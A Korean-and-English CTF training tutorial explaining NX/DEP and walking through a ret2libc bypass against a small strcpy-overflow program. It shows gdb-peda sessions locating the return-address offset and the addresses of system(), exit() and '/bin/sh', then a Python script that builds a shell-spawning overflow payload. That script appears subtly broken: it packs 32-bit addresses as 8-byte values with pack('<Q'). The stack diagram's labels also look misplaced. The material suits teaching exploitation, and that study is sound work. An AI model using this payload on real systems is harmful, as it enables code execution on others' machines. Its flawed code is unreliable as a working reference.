# NX
Also known as Data Execution Prevention (DEP), this protection marks writable regions of memory as non-executable. This prevents the processor from executing in these marked regions of memory.

If we look at the memory map of a program compiled with NX protection, the stack and heap are typically marked non-executable.

In the following diagrams, we will be introducing a new indicator colour for the memory regions to denote 'writable and non-executable' mapped regions. Firstly, the stack before the read occurs looks like this:

When we perform the same attack, the buffer is overrun and the saved pointers are overwritten once again.

After the function returns, the program will set the instruction pointer to 0xbfff0000 and attempt to execute the instructions at that address. However, since the region of memory mapped at that address has no execution permissions, the program will crash.

Thus, the attacker's exploit is thwarted.

# Vulnerable Program
```
#include <stdio.h>
#include <string.h>

void exploitme(char* input)
{
  char buf[32];
  strcpy(buf, input);
  puts(buf);
}

int main(int argc, char* argv[])
{
  if ( argc < 2 ) return -1;

  exploitme(argv[1]);

  return 0;
}
```

# Bypassing NX with Ret2Libc


![Fig 1. stack][classic1]

## return address 위치 찾기
우선 버퍼의 크기가 소스코드상에서는 32인데, 실제 Overflow 되어서 EIP가 덮어지는 정확한 지점을 알아야 한다.
```
$ gdb -q ./nxstack
Reading symbols from ./nxstack...(no debugging symbols found)...done.
```
gdb-peda에 patter_create 와 patter_offset 기능을 활용하자.
```
gdb-peda$ pattern_create 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
```
길이 50의 임의의 패턴을 생성하였다. 이를 복사하여 run 하자.
```
gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
Starting program: /home/skcctf/ctf_training/day3/nx/nxstack 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x41412941 ('A)AA')
ECX: 0xfbad0084
EDX: 0xb7fcc870 --> 0x0
ESI: 0x2
EDI: 0xb7fcb000 --> 0x1b3db0
EBP: 0x0
ESP: 0xbffff610 ("AA0AAFAAbA")
EIP: 0x61414145 ('EAAa')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x61414145
[------------------------------------stack-------------------------------------]
0000| 0xbffff610 ("AA0AAFAAbA")
0004| 0xbffff614 ("AFAAbA")
0008| 0xbffff618 --> 0xbf004162
0012| 0xbffff61c --> 0x0
0016| 0xbffff620 --> 0x0
0020| 0xbffff624 --> 0x0
0024| 0xbffff628 --> 0xb7fcb000 --> 0x1b3db0
0028| 0xbffff62c --> 0xb7fffc0c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x61414145 in ?? ()
```
현재 SIGSEGV가 발생하여 프로그램이 강제로 종료되었으며 `0x61414145 in ?? ()`라는 구문이 출력되어 있다. 
이는 EIP 레지스터에 해당 값이 들어있기 때문인데, 그 값의 위치에 접근하려다 실패했기 때문이다.
```
gdb-peda$ info register eip
eip            0x61414145	0x61414145
```
그럼 peda가 생성했던 패턴 중 `0x61414145`은 어느 지점에 있었는지를 확인하면 return address 가 위치하는 곳을 알 수 있다.
```
gdb-peda$ pattern_offset 0x61414145
1631666501 found at offset: 36
```
해당 지점은 36이다.

즉, Buffer 가 32로 선언되어있고, 그 뒤에 EBX가 push되어(+4) 36칸을 차지하며 그 뒤로는 Return Address 가 위치해야하는데, 이 부분을 다른 함수의 주소로 덮어씌우면 Return 시에 그 함수를 수행하게 된다.

## system() 의 주소
익스플로잇은 다양한 작업을 목표로 할 수 있지만 여기에서는 system("/bin/sh")를 수행하도록 할 것이다.
먼저 system() 을 수행하기 위해 LibC에서 system()이 어디에 위치했는지 찾자.
```
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xb7e51b40 <__libc_system>

gdb-peda$ x/s 0xb7e51b40
0xb7e51b40 <__libc_system>:	"\203\354\f\213D$\020\350\061h\016"
```
이로써 `0xb7e51b40`에 system()이 위치한다는 것을 확인하였다.

## /bin/sh
system()의 인자로 전달할 값을 스택에 올려두어야 한다. system("/bin/sh")를 수행하도록 할 것이므로 "/bin/sh"이 어디에 있는지 알아야 한다.
gdb로 대충 아무 부분에 브레이크 포인트 걸어놓고 실행한 상태에서 (동적상태) find 명령어로 "/bin/sh"를 찾자.
```
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xb7f748c8 ("/bin/sh")
```
이로써 `0xb7f748c8`에 "/bin/sh"이 위치한다는 것을 확인하였다.

## exit() 주소
system() 함수가 return되고 난 후 jump할 위치를 지정해야 한다.
사실 system("/bin/sh")가 호출되는 순간 이미 exploit에 성공했으므로 이 부분은 적당히 Fake 값으로 대충 "BBBB" 로 채워넣어도 무방하기는 하다.
하지만 차이점이 있다면 쉘 획득 후 작업을 종료하고 나갈 때 Error가 발생한다.
이 부분까지 깔끔하게 처리하고 싶다면 exit()의 주소를 찾은 후 이것을 호출하게 하면 마치 정상적으로 종료되는 것처럼 보이게 할 수 있다.
```
gdb-peda$ p exit
$2 = {<text variable, no debug info>} 0xb7e457f0 <__GI_exit>

gdb-peda$ x/s 0xb7e457f0
0xb7e457f0 <__GI_exit>:	"\350\204+\017"
```
이렇게 얻은 exit()의 주소는 `0xb7e457f0`이다.

## 종합
스택에 push된 값들은 역순으로 처리된다는 것을 기억해야 한다. 따라서 system()이 수행되고 난 후의 return addr이 먼저 나온다. 그리고 뒤에 system()의 argument인 /bin/sh가 들어간다. 그렇다면 system("/bin/sh")가 수행되고 난 후의 return addr의 내용을 수행하게 된다.

EIP smash = 32 + 4 = 36
system() = 0xb7e51b40
system() return address = BBBB (fake word) or exit() 
/bin/sh = 0xb7f748c8
|---------------------------|-------------------|--------------|---------------|
| 36 A's                    | 0xb7e51b40        |     BBBB     | 0xb7f748c8    |
|---------------------------|-------------------|--------------|---------------|
                       args        EBP                 EIP 

현재로써는 대충 fake값인 BBBB로 설정해두었다. 또는 `0xb7e457f0`으로 exit()를 EIP부분에 넣으면 좋다.

## Exploit code
```
from struct import *

system_addr = 0xb7e51b40 
binsh_addr  = 0xb7f748c8
exit_addr   = 0xb7e457f0

payload = "A" * 32                           # buf

payload += "A" * 4                           # ebx

payload += pack("<Q", system_addr)           # ret addr : system()

#payload += "B" * 4                          # return of system(), fake value (don't care error msg)
payload += pack("<Q", exit_addr)             # to avoid closing error, use exit() func addr

payload += pack("<Q", binsh_addr)            # /bin/sh addr

f = open("in.txt", "w")
f.write(payload)
```



[classic1]: ./nxstack_view.png
